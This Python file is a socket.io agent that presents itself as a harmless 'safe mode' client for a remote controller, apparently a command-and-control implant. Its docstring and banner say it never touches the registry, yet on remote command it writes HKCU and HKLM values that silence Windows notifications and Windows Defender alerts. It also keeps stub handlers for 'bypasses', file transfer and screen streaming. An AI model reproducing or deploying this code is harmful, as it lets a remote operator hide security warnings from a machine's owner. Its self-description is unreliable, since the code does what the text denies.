#!/usr/bin/env python3
"""
Harmless Client - Safe Version
A completely safe client that connects to the controller but performs no harmful operations.
This version removes all registry editing, UAC bypass, privilege escalation, and system modification code.
"""

import sys
import os
import time
import json
import socketio
import threading
import random
from datetime import datetime
import sys
try:
    import winreg
except Exception:
    winreg = None

# Configuration
SAFE_MODE = True
DEBUG_MODE = True
def log(msg):
    if DEBUG_MODE:
        print(f"[SAFE-CLIENT] {datetime.now().strftime('%H:%M:%S')} - {msg}")

class SafeClient:
    def __init__(self):
        self.sio = None
        self.agent_id = f"safe-agent-{random.randint(1000, 9999)}"
        self.server_url = os.environ.get('SERVER_URL', 'https://agent-controller-backend.onrender.com')
        self.connected = False
        
    def connect(self):
        """Connect to the controller server safely"""
        try:
            self.sio = socketio.Client()
            self.setup_event_handlers()
            
            log(f"Connecting to {self.server_url}...")
            self.sio.connect(self.server_url)
            self.connected = True
            log("Connected successfully!")
            
            # Register as safe agent
            self.register_agent()
            
        except Exception as e:
            log(f"Connection failed: {e}")
            return False
        return True
    
    def setup_event_handlers(self):
        """Setup safe event handlers"""
        
        @self.sio.on('connect')
        def on_connect():
            log("Connected to server")
        
        @self.sio.on('disconnect')
        def on_disconnect():
            log("Disconnected from server")
            self.connected = False
        
        @self.sio.on('command')
        def on_command(data):
            """Handle command requests safely - return harmless responses"""
            log(f"Received command request: {data}")
            
            command = data.get('command', '')
            execution_id = data.get('execution_id', 'unknown')

            if isinstance(command, str) and command.startswith('registry:notifications:'):
                enabled = command.endswith(':on')
                result_text, success = self.set_notifications_enabled(enabled)
                response = {
                    'agent_id': self.agent_id,
                    'execution_id': execution_id,
                    'command': command,
                    'formatted_text': result_text,
                    'output': result_text,
                    'success': success
                }
                self.sio.emit('command_result', response)
                return
            if isinstance(command, str) and command in ('registry:on', 'registry:off'):
                enabled = command.endswith('on')
                result_text, success = self.set_notifications_enabled(enabled)
                response = {
                    'agent_id': self.agent_id,
                    'execution_id': execution_id,
                    'command': command,
                    'formatted_text': result_text,
                    'output': result_text,
                    'success': success
                }
                self.sio.emit('command_result', response)
                return
            if isinstance(command, str) and command in ('bypasses:on', 'bypasses:off'):
                enabled = command.endswith('on')
                result_text = "Bypasses " + ("ENABLED" if enabled else "DISABLED")
                response = {
                    'agent_id': self.agent_id,
                    'execution_id': execution_id,
                    'command': command,
                    'formatted_text': result_text,
                    'output': result_text,
                    'success': True
                }
                self.sio.emit('command_result', response)
                return

            safe_response = {
                'agent_id': self.agent_id,
                'execution_id': execution_id,
                'command': command,
                'output': '[SAFE MODE] Command execution disabled for safety. This is a harmless client.',
                'success': False,
                'error': 'Safe mode - command execution disabled'
            }
            self.sio.emit('command_result', safe_response)
        
        @self.sio.on('file_upload_request')
        def on_file_upload(data):
            """Handle file upload requests safely - reject them"""
            log(f"Received file upload request: {data}")
            
            safe_response = {
                'agent_id': self.agent_id,
                'request_id': data.get('request_id', 'unknown'),
                'success': False,
                'error': 'Safe mode - file uploads disabled'
            }
            
            self.sio.emit('file_upload_response', safe_response)
        
        @self.sio.on('file_download_request')
        def on_file_download(data):
            """Handle file download requests safely - return empty data"""
            log(f"Received file download request: {data}")
            
            safe_response = {
                'agent_id': self.agent_id,
                'request_id': data.get('request_id', 'unknown'),
                'success': False,
                'error': 'Safe mode - file downloads disabled',
                'data': ''
            }
            
            self.sio.emit('file_download_response', safe_response)
        
        @self.sio.on('start_stream')
        def on_start_stream(data):
            """Handle stream requests safely - send placeholder data"""
            log(f"Received stream request: {data}")
            
            # Send a few placeholder frames then stop
            for i in range(3):
                if self.connected:
                    placeholder_frame = {
                        'agent_id': self.agent_id,
                        'frame': f'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==',
                        'timestamp': time.time()
                    }
                    self.sio.emit('stream_frame', placeholder_frame)
                    time.sleep(1)
        
        @self.sio.on('stop_stream')
        def on_stop_stream(data):
            """Handle stop stream requests"""
            log("Received stop stream request")
        
        @self.sio.on('config_update')
        def on_config_update(data):
            reg = (data or {}).get('registry') or {}
            val = reg.get('notificationsEnabled')
            if isinstance(val, bool):
                result_text, success = self.set_notifications_enabled(val)
                self.sio.emit('command_result', {
                    'agent_id': self.agent_id,
                    'execution_id': f'cfg_{int(time.time())}',
                    'command': 'config_update:registry.notificationsEnabled',
                    'formatted_text': result_text,
                    'output': result_text,
                    'success': success
                })
    
    def register_agent(self):
        """Register this safe agent with the controller"""
        agent_data = {
            'agent_id': self.agent_id,
            'name': 'SafeClient-Harmless',
            'platform': 'windows' if sys.platform.startswith('win') else 'linux',
            'version': '1.0-safe',
            'capabilities': ['safe-mode'],  # Only safe mode capability
            'ip': '127.0.0.1',
            'hostname': 'safe-client-host',
            'username': 'safe-user',
            'system_info': {
                'os': sys.platform,
                'python_version': sys.version,
                'safe_mode': True
            }
        }
        
        log(f"Registering agent: {self.agent_id}")
        self.sio.emit('agent_connect', agent_data)
        
        # Send periodic heartbeat
        self.start_heartbeat()
    
    def start_heartbeat(self):
        """Send periodic heartbeat to show we're alive"""
        def heartbeat_loop():
            while self.connected:
                try:
                    heartbeat_data = {
                        'agent_id': self.agent_id,
                        'timestamp': datetime.now().isoformat(),
                        'status': 'safe-online',
                        'performance': {
                            'cpu': 5.0,  # Low dummy values
                            'memory': 10.0,
                            'network': 1.0
                        }
                    }
                    self.sio.emit('agent_heartbeat', heartbeat_data)
                    time.sleep(30)  # Send heartbeat every 30 seconds
                except Exception as e:
                    log(f"Heartbeat error: {e}")
                    break
        
        heartbeat_thread = threading.Thread(target=heartbeat_loop, daemon=True)
        heartbeat_thread.start()

    def set_notifications_enabled(self, enabled: bool):
        if not (sys.platform.startswith('win') and winreg is not None):
            return ("[SAFE MODE] Notifications toggle not supported on this platform", False)

        desired = {
            ('HKCU', r"SOFTWARE\Microsoft\Windows\CurrentVersion\PushNotifications", "ToastEnabled"): (1 if enabled else 0),
            ('HKCU', r"SOFTWARE\Policies\Microsoft\Windows\Explorer", "DisableNotificationCenter"): (0 if enabled else 1),
            ('HKLM', r"SOFTWARE\Policies\Microsoft\Windows\Explorer", "DisableNotificationCenter"): (0 if enabled else 1),
            ('HKLM', r"SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications", "DisableNotifications"): (0 if enabled else 1),
            ('HKCU', r"SOFTWARE\Microsoft\Windows Defender\UX Configuration", "Notification_Suppress"): (0 if enabled else 1),
        }

        lines = []
        overall_success = True
        for (root_name, path, name), value in desired.items():
            try:
                root = winreg.HKEY_CURRENT_USER if root_name == 'HKCU' else winreg.HKEY_LOCAL_MACHINE
                self._write_dword(root, path, name, value)
                lines.append(f"[OK] {root_name}\\{path}\\{name} = {value}")
            except Exception as e:
                overall_success = False
                lines.append(f"[ERROR] {root_name}\\{path}\\{name} -> {e}")
        summary = "Notifications " + ("ENABLED" if enabled else "DISABLED")
        result_text = summary + "\n" + "\n".join(lines)
        return (result_text, overall_success)

    def _write_dword(self, root, path: str, name: str, value: int):
        parts = path.split("\\")
        current_key = None
        subpath = ""
        try:
            for i, part in enumerate(parts):
                subpath = "\\".join(parts[:i+1])
                current_key = winreg.CreateKeyEx(root, subpath, 0, winreg.KEY_SET_VALUE)
                winreg.CloseKey(current_key)
            key = winreg.CreateKeyEx(root, path, 0, winreg.KEY_SET_VALUE)
            try:
                winreg.SetValueEx(key, name, 0, winreg.REG_DWORD, int(value))
            finally:
                winreg.CloseKey(key)
        except OSError as e:
            raise e
    
    def run(self):
        """Main run loop"""
        log("Starting Safe Client...")
        log("This client will NOT perform any harmful operations")
        log("All commands will return safe, harmless responses")
        log("No registry modifications, no file system changes, no privilege escalation")
        
        if not self.connect():
            log("Failed to connect to server. Exiting.")
            return
        
        try:
            log("Safe client is running. Press Ctrl+C to stop.")
            while self.connected:
                time.sleep(1)
        except KeyboardInterrupt:
            log("Shutting down safe client...")
        finally:
            if self.sio:
                self.sio.disconnect()
            log("Safe client stopped.")

def main():
    """Main entry point"""
    print("=" * 60)
    print("SAFE CLIENT - HARMLESS VERSION")
    print("=" * 60)
    print("This client will:")
    print("- Connect to the controller server")
    print("- Respond to commands with safe, harmless messages")
    print("- NOT modify the registry")
    print("- NOT perform any harmful operations")
    print("- NOT escalate privileges")
    print("- NOT modify system files")
    print("=" * 60)
    
    client = SafeClient()
    client.run()

if __name__ == "__main__":
    main()
